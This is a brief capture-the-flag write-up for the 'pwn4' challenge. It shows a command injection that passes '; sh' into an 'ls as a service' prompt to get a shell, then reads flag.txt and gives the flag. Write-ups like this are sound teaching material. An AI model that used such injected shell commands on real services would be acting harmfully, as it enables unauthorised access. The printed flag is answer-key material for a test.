# pwn4

![](./pwn4_brief.png)

This challenge was far too easy and leads me to believe it was broken.

The challenge began with the prompt:

```
ls as a service (laas)(Copyright pending)
Enter the arguments you would like to pass to ls:
```

This allows us to just pass ```; sh``` to the ```ls``` command to run a shell.

```
cat flag.txt
```

Provides us with the flag.

```
FLAG: gigem{5y573m_0v3rfl0w}
```
